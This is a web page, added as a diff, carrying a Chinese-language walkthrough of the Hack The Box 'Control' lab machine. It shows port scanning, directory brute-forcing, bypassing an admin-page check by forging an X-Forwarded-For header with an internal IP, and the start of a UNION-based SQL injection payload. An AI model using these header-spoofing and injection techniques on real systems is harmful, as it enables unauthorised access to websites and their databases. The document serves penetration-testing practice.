@@ -1,0 +1,667 @@
+<!doctype html><html lang=en><head><meta charset=UTF-8><meta http-equiv=X-UA-Compatible content="ie=edge"><meta name=viewport content="width=device-width,initial-scale=1,shrink-to-fit=no"><meta name=author content><meta name=description content="Nmap 探索 扫描开放的端口。
+┌──(kali㉿kali)-[~/Work/Kali/Control] └─$ sudo nmap --min-rate 10000 -p- 10.129.54.109 -oA Nmap/ports [sudo] password for kali: Starting Nmap 7.98 ( https://nmap.org ) at 2026-10-12 02:49 -0400 Nmap scan report for 10.129.54.109 Host is up (0.16s latency). Not shown: 65530 filtered tcp ports (no-response) PORT STATE SERVICE 80/tcp open http 135/tcp open msrpc 3306/tcp open mysql 49666/tcp open unknown 49667/tcp open unknown Nmap done: 1 IP address (1 host up) scanned in 14."><meta name=keywords content=",Hack,Windows,HTB,Writeup,SQL注入,MYSQL,BurpSuite,PrintSpoofer,JuciePotato,代码执行"><meta name=robots content="noodp"><meta name=theme-color content><link rel=canonical href=https://enilmalus.github.io/posts/htb-control-writeup/><title>HTB-Control Writeup :: Welcome My Hack's Blog
+</title><link rel=stylesheet href=/main.min.ab5336003ba331300318b49292c672210905baf1ef5410a739f647e70c8808fa.css integrity="sha256-q1M2ADujMTADGLSSksZyIQkFuvHvVBCnOfZH5wyICPo=" crossorigin=anonymous><link rel=apple-touch-icon sizes=180x180 href=/apple-touch-icon.png><link rel=icon type=image/png sizes=32x32 href=/favicon-32x32.png><link rel=icon type=image/png sizes=16x16 href=/favicon-16x16.png><link rel=manifest href=/site.webmanifest><link rel=mask-icon href=/safari-pinned-tab.svg color><link rel="shortcut icon" href=/favicon.ico><meta name=msapplication-TileColor content><meta itemprop=name content="HTB-Control Writeup"><meta itemprop=description content="Nmap 探索 扫描开放的端口。
+┌──(kali㉿kali)-[~/Work/Kali/Control] └─$ sudo nmap --min-rate 10000 -p- 10.129.54.109 -oA Nmap/ports [sudo] password for kali: Starting Nmap 7.98 ( https://nmap.org ) at 2026-10-12 02:49 -0400 Nmap scan report for 10.129.54.109 Host is up (0.16s latency). Not shown: 65530 filtered tcp ports (no-response) PORT STATE SERVICE 80/tcp open http 135/tcp open msrpc 3306/tcp open mysql 49666/tcp open unknown 49667/tcp open unknown Nmap done: 1 IP address (1 host up) scanned in 14."><meta itemprop=datePublished content="2026-10-13T14:00:00+08:00"><meta itemprop=dateModified content="2026-10-13T14:00:00+08:00"><meta itemprop=wordCount content="3596"><meta itemprop=keywords content="Hack,Windows,HTB,Writeup,SQL注入,MYSQL,BurpSuite,PrintSpoofer,JuciePotato,代码执行,"><meta name=twitter:card content="summary"><meta name=twitter:title content="HTB-Control Writeup"><meta name=twitter:description content="Nmap 探索 扫描开放的端口。
+┌──(kali㉿kali)-[~/Work/Kali/Control] └─$ sudo nmap --min-rate 10000 -p- 10.129.54.109 -oA Nmap/ports [sudo] password for kali: Starting Nmap 7.98 ( https://nmap.org ) at 2026-10-12 02:49 -0400 Nmap scan report for 10.129.54.109 Host is up (0.16s latency). Not shown: 65530 filtered tcp ports (no-response) PORT STATE SERVICE 80/tcp open http 135/tcp open msrpc 3306/tcp open mysql 49666/tcp open unknown 49667/tcp open unknown Nmap done: 1 IP address (1 host up) scanned in 14."><meta property="article:published_time" content="2026-10-13 14:00:00 +0800 +0800"></head><body><div class=container><header class=header><span class=header__inner><a href=/ style=text-decoration:none><div class=logo><span class=logo__mark>></span>
+<span class=logo__text>hello</span>
+<span class=logo__cursor></span></div></a><span class=header__right><nav class=menu><ul class=menu__inner><li><a href=/english-articles/>English Articles</a></li><li><a href=/long-articles/>长文章</a></li><li><a href=/posts/>文章</a></li><li><a href=/tags/>标签</a></li><li><a href=/tools/>工具专区</a></li></ul></nav><span class=menu-trigger><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M0 0h24v24H0z" fill="none"/><path d="M3 18h18v-2H3v2zm0-5h18v-2H3v2zm0-7v2h18V6H3z"/></svg></span></span></span></header><div class=content><main class=post><div class=post-info><p><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-clock"><circle cx="12" cy="12" r="10"/><polyline points="12 6 12 12 16 14"/></svg>
+17 minutes</p></div><article><h1 class=post-title><a href=https://enilmalus.github.io/posts/htb-control-writeup/>HTB-Control Writeup</a></h1><hr><aside id=toc><div class=toc-title>Table of Contents</div><nav id=TableOfContents><ul><li><a href=#nmap-探索>Nmap 探索</a></li><li><a href=#web-渗透>Web 渗透</a></li><li><a href=#sql-注入>SQL 注入</a></li><li><a href=#代码执行>代码执行</a></li><li><a href=#提权至-hector>提权至 hector</a></li><li><a href=#提权至-administrator>提权至 Administrator</a></li></ul></nav></aside><hr><div class=post-content><h2 id=nmap-探索>Nmap 探索</h2><p>扫描开放的端口。</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>┌──<span style=color:#f92672>(</span>kali㉿kali<span style=color:#f92672>)</span>-<span style=color:#f92672>[</span>~/Work/Kali/Control<span style=color:#f92672>]</span>
+</span></span><span style=display:flex><span>└─$ sudo nmap --min-rate <span style=color:#ae81ff>10000</span> -p- 10.129.54.109 -oA Nmap/ports
+</span></span><span style=display:flex><span><span style=color:#f92672>[</span>sudo<span style=color:#f92672>]</span> password <span style=color:#66d9ef>for</span> kali:
+</span></span><span style=display:flex><span>Starting Nmap 7.98 <span style=color:#f92672>(</span> https://nmap.org <span style=color:#f92672>)</span> at 2026-10-12 02:49 -0400
+</span></span><span style=display:flex><span>Nmap scan report <span style=color:#66d9ef>for</span> 10.129.54.109
+</span></span><span style=display:flex><span>Host is up <span style=color:#f92672>(</span>0.16s latency<span style=color:#f92672>)</span>.
+</span></span><span style=display:flex><span>Not shown: <span style=color:#ae81ff>65530</span> filtered tcp ports <span style=color:#f92672>(</span>no-response<span style=color:#f92672>)</span>
+</span></span><span style=display:flex><span>PORT      STATE SERVICE
+</span></span><span style=display:flex><span>80/tcp    open  http
+</span></span><span style=display:flex><span>135/tcp   open  msrpc
+</span></span><span style=display:flex><span>3306/tcp  open  mysql
+</span></span><span style=display:flex><span>49666/tcp open  unknown
+</span></span><span style=display:flex><span>49667/tcp open  unknown
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>Nmap <span style=color:#66d9ef>done</span>: <span style=color:#ae81ff>1</span> IP address <span style=color:#f92672>(</span><span style=color:#ae81ff>1</span> host up<span style=color:#f92672>)</span> scanned in 14.62 seconds
+</span></span><span style=display:flex><span>┌──<span style=color:#f92672>(</span>kali㉿kali<span style=color:#f92672>)</span>-<span style=color:#f92672>[</span>~/Work/Kali/Control<span style=color:#f92672>]</span>
+</span></span><span style=display:flex><span>└─$ grep open Nmap/ports.nmap | awk -F <span style=color:#e6db74>&#39;/&#39;</span> <span style=color:#e6db74>&#39;{print $1}&#39;</span> | paste -sd <span style=color:#e6db74>&#39;,&#39;</span>
+</span></span><span style=display:flex><span>80,135,3306,49666,49667
+</span></span></code></pre></div><p>对开放的端口做详细信息扫描，开放了 80、135、3306 端口。</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>┌──<span style=color:#f92672>(</span>kali㉿kali<span style=color:#f92672>)</span>-<span style=color:#f92672>[</span>~/Work/Kali/Control<span style=color:#f92672>]</span>
+</span></span><span style=display:flex><span>└─$ sudo nmap -sT -sC -sV -O -p80,135,3306,49666,49667 10.129.54.109 -oA Nmap/detail
+</span></span><span style=display:flex><span><span style=color:#f92672>[</span>sudo<span style=color:#f92672>]</span> password <span style=color:#66d9ef>for</span> kali:
+</span></span><span style=display:flex><span>Starting Nmap 7.98 <span style=color:#f92672>(</span> https://nmap.org <span style=color:#f92672>)</span> at 2026-10-12 02:50 -0400
+</span></span><span style=display:flex><span>Nmap scan report <span style=color:#66d9ef>for</span> 10.129.54.109
+</span></span><span style=display:flex><span>Host is up <span style=color:#f92672>(</span>0.11s latency<span style=color:#f92672>)</span>.
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>PORT      STATE SERVICE VERSION
+</span></span><span style=display:flex><span>80/tcp    open  http    Microsoft IIS httpd 10.0
+</span></span><span style=display:flex><span>|_http-server-header: Microsoft-IIS/10.0
+</span></span><span style=display:flex><span>|_http-title: Fidelity
+</span></span><span style=display:flex><span>| http-methods:
+</span></span><span style=display:flex><span>|_  Potentially risky methods: TRACE
+</span></span><span style=display:flex><span>135/tcp   open  msrpc   Microsoft Windows RPC
+</span></span><span style=display:flex><span>3306/tcp  open  mysql   MariaDB 10.3.24 or later <span style=color:#f92672>(</span>unauthorized<span style=color:#f92672>)</span>
+</span></span><span style=display:flex><span>49666/tcp open  msrpc   Microsoft Windows RPC
+</span></span><span style=display:flex><span>49667/tcp open  msrpc   Microsoft Windows RPC
+</span></span><span style=display:flex><span>Warning: OSScan results may be unreliable because we could not find at least <span style=color:#ae81ff>1</span> open and <span style=color:#ae81ff>1</span> closed port
+</span></span><span style=display:flex><span>Device type: general purpose
+</span></span><span style=display:flex><span>Running <span style=color:#f92672>(</span>JUST GUESSING<span style=color:#f92672>)</span>: Microsoft Windows 2019|<span style=color:#ae81ff>10</span> <span style=color:#f92672>(</span>97%<span style=color:#f92672>)</span>
+</span></span><span style=display:flex><span>OS CPE: cpe:/o:microsoft:windows_server_2019 cpe:/o:microsoft:windows_10
+</span></span><span style=display:flex><span>Aggressive OS guesses: Windows Server <span style=color:#ae81ff>2019</span> <span style=color:#f92672>(</span>97%<span style=color:#f92672>)</span>, Microsoft Windows <span style=color:#ae81ff>10</span> <span style=color:#ae81ff>1903</span> - 21H1 <span style=color:#f92672>(</span>91%<span style=color:#f92672>)</span>
+</span></span><span style=display:flex><span>No exact OS matches <span style=color:#66d9ef>for</span> host <span style=color:#f92672>(</span>test conditions non-ideal<span style=color:#f92672>)</span>.
+</span></span><span style=display:flex><span>Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+</span></span><span style=display:flex><span>Nmap <span style=color:#66d9ef>done</span>: <span style=color:#ae81ff>1</span> IP address <span style=color:#f92672>(</span><span style=color:#ae81ff>1</span> host up<span style=color:#f92672>)</span> scanned in 67.62 seconds
+</span></span></code></pre></div><h2 id=web-渗透>Web 渗透</h2><p>whatweb 识别 Web 技术栈，拿到了 IIS、MariaDB、RPC 端点的信息。</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>┌──<span style=color:#f92672>(</span>kali㉿kali<span style=color:#f92672>)</span>-<span style=color:#f92672>[</span>~/Work/Kali/Control<span style=color:#f92672>]</span>
+</span></span><span style=display:flex><span>└─$ whatweb http://10.129.54.109
+</span></span><span style=display:flex><span>http://10.129.54.109 <span style=color:#f92672>[</span><span style=color:#ae81ff>200</span> OK<span style=color:#f92672>]</span> Country<span style=color:#f92672>[</span>RESERVED<span style=color:#f92672>][</span>ZZ<span style=color:#f92672>]</span>, HTML5, HTTPServer<span style=color:#f92672>[</span>Microsoft-IIS/10.0<span style=color:#f92672>]</span>, IP<span style=color:#f92672>[</span>10.129.54.109<span style=color:#f92672>]</span>, JQuery, Microsoft-IIS<span style=color:#f92672>[</span>10.0<span style=color:#f92672>]</span>, PHP<span style=color:#f92672>[</span>7.3.7<span style=color:#f92672>]</span>, Script<span style=color:#f92672>[</span>text/javascript<span style=color:#f92672>]</span>, Title<span style=color:#f92672>[</span>Fidelity<span style=color:#f92672>]</span>, X-Powered-By<span style=color:#f92672>[</span>PHP/7.3.7<span style=color:#f92672>]</span>
+</span></span></code></pre></div><p>浏览 web 界面，导航上有 Home、About、Admin。</p><p><img src=Pasted%20image%2020261012145731.png alt></p><p>Admin 界面，但是被拒绝了，提示要添加请求头。</p><p><img src=Pasted%20image%2020261012145958.png alt></p><p>进行目录爆破。</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>┌──<span style=color:#f92672>(</span>kali㉿kali<span style=color:#f92672>)</span>-<span style=color:#f92672>[</span>~/Work/Kali/Control<span style=color:#f92672>]</span>
+</span></span><span style=display:flex><span>└─$ sudo feroxbuster -u http://10.129.54.109/ -w /usr/share/seclists/Discovery/Web-Content/common.txt
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span> ___  ___  __   __     __      __         __   ___
+</span></span><span style=display:flex><span>|__  |__  |__<span style=color:#f92672>)</span> |__<span style=color:#f92672>)</span> | /  <span style=color:#e6db74>`</span>    /  <span style=color:#ae81ff>\ \_</span>/ | |  <span style=color:#ae81ff>\ </span>|__
+</span></span><span style=display:flex><span>|    |___ |  <span style=color:#ae81ff>\ </span>|  <span style=color:#ae81ff>\ </span>| <span style=color:#ae81ff>\_</span>_,    <span style=color:#ae81ff>\_</span>_/ / <span style=color:#ae81ff>\ </span>| |__/ |___
+</span></span><span style=display:flex><span>by Ben <span style=color:#e6db74>&#34;epi&#34;</span> Risher 🤓                 ver: 2.13.1
+</span></span><span style=display:flex><span>───────────────────────────┬──────────────────────
+</span></span><span style=display:flex><span> 🎯  Target Url            │ http://10.129.54.109/
+</span></span><span style=display:flex><span> 🚩  In-Scope Url          │ 10.129.54.109
+</span></span><span style=display:flex><span> 🚀  Threads               │ <span style=color:#ae81ff>50</span>
+</span></span><span style=display:flex><span> 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/common.txt
+</span></span><span style=display:flex><span> 👌  Status Codes          │ All Status Codes!
+</span></span><span style=display:flex><span> 💥  Timeout <span style=color:#f92672>(</span>secs<span style=color:#f92672>)</span>        │ <span style=color:#ae81ff>7</span>
+</span></span><span style=display:flex><span> 🦡  User-Agent            │ feroxbuster/2.13.1
+</span></span><span style=display:flex><span> 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
+</span></span><span style=display:flex><span> 🔎  Extract Links         │ true
+</span></span><span style=display:flex><span> 🏁  HTTP methods          │ <span style=color:#f92672>[</span>GET<span style=color:#f92672>]</span>
+</span></span><span style=display:flex><span> 🔃  Recursion Depth       │ <span style=color:#ae81ff>4</span>
+</span></span><span style=display:flex><span>───────────────────────────┴──────────────────────
+</span></span><span style=display:flex><span> 🏁  Press <span style=color:#f92672>[</span>ENTER<span style=color:#f92672>]</span> to use the Scan Management Menu™
+</span></span><span style=display:flex><span>──────────────────────────────────────────────────
+</span></span><span style=display:flex><span><span style=color:#ae81ff>404</span>      GET       29l       95w     1245c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
+</span></span><span style=display:flex><span><span style=color:#ae81ff>200</span>      GET       89l      238w     3145c http://10.129.54.109/index.php
+</span></span><span style=display:flex><span><span style=color:#ae81ff>200</span>      GET       15l       34w      256c http://10.129.54.109/assets/css/noscript.css
+</span></span><span style=display:flex><span><span style=color:#ae81ff>200</span>      GET        1l       15w       89c http://10.129.54.109/admin.php
+</span></span><span style=display:flex><span><span style=color:#ae81ff>200</span>      GET      587l     1232w    12433c http://10.129.54.109/assets/js/util.js
+</span></span><span style=display:flex><span><span style=color:#ae81ff>200</span>      GET      187l      706w     7867c http://10.129.54.109/about.php
+</span></span><span style=display:flex><span><span style=color:#ae81ff>200</span>      GET        2l       87w     2439c http://10.129.54.109/assets/js/breakpoints.min.js
+</span></span><span style=display:flex><span><span style=color:#ae81ff>200</span>      GET        2l       39w     5106c http://10.129.54.109/assets/js/jquery.dropotron.min.js
+</span></span><span style=display:flex><span><span style=color:#ae81ff>200</span>      GET        2l       51w     1851c http://10.129.54.109/assets/js/browser.min.js
+</span></span><span style=display:flex><span><span style=color:#ae81ff>200</span>      GET        2l       23w      831c http://10.129.54.109/assets/js/jquery.scrolly.min.js
+</span></span><span style=display:flex><span><span style=color:#ae81ff>200</span>      GET       25l       55w      943c http://10.129.54.109/assets/js/functions.js
+</span></span><span style=display:flex><span><span style=color:#ae81ff>200</span>      GET      250l      481w     4836c http://10.129.54.109/assets/js/main.js
+</span></span><span style=display:flex><span><span style=color:#ae81ff>200</span>      GET        2l       37w     2257c http://10.129.54.109/assets/js/jquery.scrollex.min.js
+</span></span><span style=display:flex><span><span style=color:#ae81ff>200</span>      GET     4111l     7901w    73447c http://10.129.54.109/assets/css/main.css
+</span></span><span style=display:flex><span><span style=color:#ae81ff>200</span>      GET      369l     1127w   134268c http://10.129.54.109/images/pic01.jpg
+</span></span><span style=display:flex><span><span style=color:#ae81ff>200</span>      GET        2l     1276w    88145c http://10.129.54.109/assets/js/jquery.min.js
+</span></span><span style=display:flex><span><span style=color:#ae81ff>200</span>      GET       89l      238w     3145c http://10.129.54.109/
+</span></span><span style=display:flex><span><span style=color:#ae81ff>403</span>      GET       29l       92w     1233c http://10.129.54.109/assets/css/
+</span></span><span style=display:flex><span><span style=color:#ae81ff>403</span>      GET       29l       92w     1233c http://10.129.54.109/assets/
+</span></span><span style=display:flex><span><span style=color:#ae81ff>403</span>      GET       29l       92w     1233c http://10.129.54.109/assets/js/
+</span></span><span style=display:flex><span><span style=color:#ae81ff>403</span>      GET       29l       92w     1233c http://10.129.54.109/images/
+</span></span><span style=display:flex><span><span style=color:#ae81ff>301</span>      GET        2l       10w      151c http://10.129.54.109/Images <span style=color:#f92672>=</span>&gt; http://10.129.54.109/Images/
+</span></span><span style=display:flex><span><span style=color:#ae81ff>301</span>      GET        2l       10w      162c http://10.129.54.109/assets/css/Images <span style=color:#f92672>=</span>&gt; http://10.129.54.109/assets/css/Images/
+</span></span><span style=display:flex><span><span style=color:#ae81ff>301</span>      GET        2l       10w      151c http://10.129.54.109/assets <span style=color:#f92672>=</span>&gt; http://10.129.54.109/assets/
+</span></span><span style=display:flex><span><span style=color:#ae81ff>301</span>      GET        2l       10w      155c http://10.129.54.109/assets/css <span style=color:#f92672>=</span>&gt; http://10.129.54.109/assets/css/
+</span></span><span style=display:flex><span><span style=color:#ae81ff>301</span>      GET        2l       10w      151c http://10.129.54.109/images <span style=color:#f92672>=</span>&gt; http://10.129.54.109/images/
+</span></span><span style=display:flex><span><span style=color:#ae81ff>301</span>      GET        2l       10w      162c http://10.129.54.109/assets/css/images <span style=color:#f92672>=</span>&gt; http://10.129.54.109/assets/css/images/
+</span></span><span style=display:flex><span><span style=color:#ae81ff>301</span>      GET        2l       10w      154c http://10.129.54.109/assets/js <span style=color:#f92672>=</span>&gt; http://10.129.54.109/assets/js/
+</span></span><span style=display:flex><span><span style=color:#ae81ff>301</span>      GET        2l       10w      165c http://10.129.54.109/assets/css/Images/ie <span style=color:#f92672>=</span>&gt; http://10.129.54.109/assets/css/Images/ie/
+</span></span><span style=display:flex><span><span style=color:#ae81ff>301</span>      GET        2l       10w      152c http://10.129.54.109/uploads <span style=color:#f92672>=</span>&gt; http://10.129.54.109/uploads/
+</span></span><span style=display:flex><span><span style=color:#ae81ff>301</span>      GET        2l       10w      165c http://10.129.54.109/assets/css/images/ie <span style=color:#f92672>=</span>&gt; http://10.129.54.109/assets/css/images/ie/
+</span></span><span style=display:flex><span><span style=color:#f92672>[</span><span style=color:#75715e>####################] - 26s    42815/42815   0s      found:30      errors:0</span>
+</span></span><span style=display:flex><span><span style=color:#f92672>[</span><span style=color:#75715e>####################] - 14s     4751/4751    349/s   http://10.129.54.109/</span>
+</span></span><span style=display:flex><span><span style=color:#f92672>[</span><span style=color:#75715e>####################] - 13s     4751/4751    366/s   http://10.129.54.109/assets/css/</span>
+</span></span><span style=display:flex><span><span style=color:#f92672>[</span><span style=color:#75715e>####################] - 13s     4751/4751    366/s   http://10.129.54.109/assets/</span>
+</span></span><span style=display:flex><span><span style=color:#f92672>[</span><span style=color:#75715e>####################] - 13s     4751/4751    366/s   http://10.129.54.109/assets/js/</span>
+</span></span><span style=display:flex><span><span style=color:#f92672>[</span><span style=color:#75715e>####################] - 13s     4751/4751    366/s   http://10.129.54.109/images/</span>
+</span></span><span style=display:flex><span><span style=color:#f92672>[</span><span style=color:#75715e>####################] - 13s     4751/4751    361/s   http://10.129.54.109/Images/</span>
+</span></span><span style=display:flex><span><span style=color:#f92672>[</span><span style=color:#75715e>####################] - 13s     4751/4751    354/s   http://10.129.54.109/assets/css/Images/</span>
+</span></span><span style=display:flex><span><span style=color:#f92672>[</span><span style=color:#75715e>####################] - 13s     4751/4751    372/s   http://10.129.54.109/assets/css/images/</span>
+</span></span><span style=display:flex><span><span style=color:#f92672>[</span><span style=color:#75715e>####################] - 12s     4751/4751    389/s   http://10.129.54.109/uploads/                                                                                                 </span>
+</span></span></code></pre></div><p>Mysql 是存活的，返回本机地址和拒绝连接，说明 3306 只对本地开放。</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>┌──<span style=color:#f92672>(</span>kali㉿kali<span style=color:#f92672>)</span>-<span style=color:#f92672>[</span>~/Work/Kali/Control<span style=color:#f92672>]</span>
+</span></span><span style=display:flex><span>└─$ nmap -p3306 --script mysql-info,mysql-empty-password,mysql-databases,mysql-users 10.129.54.109
+</span></span><span style=display:flex><span>Starting Nmap 7.98 <span style=color:#f92672>(</span> https://nmap.org <span style=color:#f92672>)</span> at 2026-10-12 03:11 -0400
+</span></span><span style=display:flex><span>Nmap scan report <span style=color:#66d9ef>for</span> 10.129.54.109
+</span></span><span style=display:flex><span>Host is up <span style=color:#f92672>(</span>0.10s latency<span style=color:#f92672>)</span>.
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>PORT     STATE SERVICE
+</span></span><span style=display:flex><span>3306/tcp open  mysql
+</span></span><span style=display:flex><span>|_mysql-empty-password: Host <span style=color:#e6db74>&#39;10.10.16.151&#39;</span> is not allowed to connect to this MariaDB server
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>Nmap <span style=color:#66d9ef>done</span>: <span style=color:#ae81ff>1</span> IP address <span style=color:#f92672>(</span><span style=color:#ae81ff>1</span> host up<span style=color:#f92672>)</span> scanned in 1.10 seconds
+</span></span></code></pre></div><p>构造请求头 127.0.0.1，访问被拒绝。</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>┌──<span style=color:#f92672>(</span>kali㉿kali<span style=color:#f92672>)</span>-<span style=color:#f92672>[</span>~/Work/Kali/Control<span style=color:#f92672>]</span>
+</span></span><span style=display:flex><span>└─$ curl -i -sS -H <span style=color:#e6db74>&#34;X-Forwarded-For: 127.0.0.1&#34;</span> http://10.129.54.109/admin.php
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>HTTP/1.1 <span style=color:#ae81ff>200</span> OK
+</span></span><span style=display:flex><span>Content-Type: text/html; charset<span style=color:#f92672>=</span>UTF-8
+</span></span><span style=display:flex><span>Server: Microsoft-IIS/10.0
+</span></span><span style=display:flex><span>X-Powered-By: PHP/7.3.7
+</span></span><span style=display:flex><span>Date: Mon, <span style=color:#ae81ff>12</span> Oct <span style=color:#ae81ff>2026</span> 07:20:21 GMT
+</span></span><span style=display:flex><span>Content-Length: <span style=color:#ae81ff>89</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>Access Denied: Header Missing. Please ensure you go through the proxy to access this page                                                                               
+</span></span></code></pre></div><p>一次性尝试更多访问头，但是都失败了，可能 ip 不是 127.0.0.1。</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>┌──<span style=color:#f92672>(</span>kali㉿kali<span style=color:#f92672>)</span>-<span style=color:#f92672>[</span>~/Work/Kali/Control<span style=color:#f92672>]</span>
+</span></span><span style=display:flex><span>└─$ curl -i -sS -H <span style=color:#e6db74>&#34;X-Forwarded-For: 127.0.0.1&#34;</span> -H <span style=color:#e6db74>&#34;Client-IP: 127.0.0.1&#34;</span> -H <span style=color:#e6db74>&#34;X-Client-IP: 127.0.0.1&#34;</span> -H <span style=color:#e6db74>&#34;X-Real-IP: 127.0.0.1&#34;</span> -H <span style=color:#e6db74>&#34;X-Originating-IP: 127.0.0.1&#34;</span> -H <span style=color:#e6db74>&#34;X-Remote-Addr: 127.0.0.1&#34;</span> -H <span style=color:#e6db74>&#34;X-Proxy-IP: 127.0.0.1&#34;</span> -H <span style=color:#e6db74>&#34;Forwarded: for=127.0.0.1&#34;</span> -H <span style=color:#e6db74>&#34;Via: 1.1 localhost&#34;</span> http://10.129.54.109/admin.php
+</span></span><span style=display:flex><span>HTTP/1.1 <span style=color:#ae81ff>200</span> OK
+</span></span><span style=display:flex><span>Content-Type: text/html; charset<span style=color:#f92672>=</span>UTF-8
+</span></span><span style=display:flex><span>Server: Microsoft-IIS/10.0
+</span></span><span style=display:flex><span>X-Powered-By: PHP/7.3.7
+</span></span><span style=display:flex><span>Date: Mon, <span style=color:#ae81ff>12</span> Oct <span style=color:#ae81ff>2026</span> 07:23:13 GMT
+</span></span><span style=display:flex><span>Content-Length: <span style=color:#ae81ff>89</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>Access Denied: Header Missing. Please ensure you go through the proxy to access this page                                                                               
+</span></span></code></pre></div><p>在 index 界面的源码里发现了一段信息，证书放在 \192.168.4.28\myfiles，这个可能是正确的 IP。</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>	&lt;!-- To Do:
+</span></span><span style=display:flex><span>			- Import Products
+</span></span><span style=display:flex><span>			- Link to new payment system
+</span></span><span style=display:flex><span>			- Enable SSL <span style=color:#f92672>(</span>Certificates location <span style=color:#ae81ff>\\</span>192.168.4.28<span style=color:#ae81ff>\m</span>yfiles<span style=color:#f92672>)</span>
+</span></span></code></pre></div><p>burp 构造请求体，加上这个 IP。</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>GET /admin.php HTTP/1.1
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>Host: 10.129.54.109
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>Cache-Control: max-age<span style=color:#f92672>=</span><span style=color:#ae81ff>0</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>Accept-Language: en-US,en;q<span style=color:#f92672>=</span>0.9
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>Upgrade-Insecure-Requests: <span style=color:#ae81ff>1</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>User-Agent: Mozilla/5.0 <span style=color:#f92672>(</span>X11; Linux x86_64<span style=color:#f92672>)</span> AppleWebKit/537.36 <span style=color:#f92672>(</span>KHTML, like Gecko<span style=color:#f92672>)</span> Chrome/146.0.0.0 Safari/537.36
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>Accept: text/html,application/xhtml+xml,application/xml;q<span style=color:#f92672>=</span>0.9,image/avif,image/webp,image/apng,*/*;q<span style=color:#f92672>=</span>0.8,application/signed-exchange;v<span style=color:#f92672>=</span>b3;q<span style=color:#f92672>=</span>0.7
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>Referer: http://10.129.54.109/index.php
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>Accept-Encoding: gzip, deflate, br
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>Connection: keep-alive
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>X-Forwarded-For: 192.168.4.28
+</span></span></code></pre></div><p>可以在设置里为每个请求都加上 <code>X-Forwarded-For: 192.168.4.28</code>。</p><p><img src=Pasted%20image%2020261012155018.png alt></p><p>可以看到访问成功了。</p><p><img src=Pasted%20image%2020261012155258.png alt></p><h2 id=sql-注入>SQL 注入</h2><p>在搜索框尝试一下 SQL 注入。</p><p><img src=Pasted%20image%2020261012160839.png alt></p><p>出现了报错。</p><p><img src=Pasted%20image%2020261012161037.png alt></p><p>尝试注入语句，暴露出了版本名，确认存在注入。</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>&#39;</span> UNION SELECT @@version,2,3,4,5,6-- -
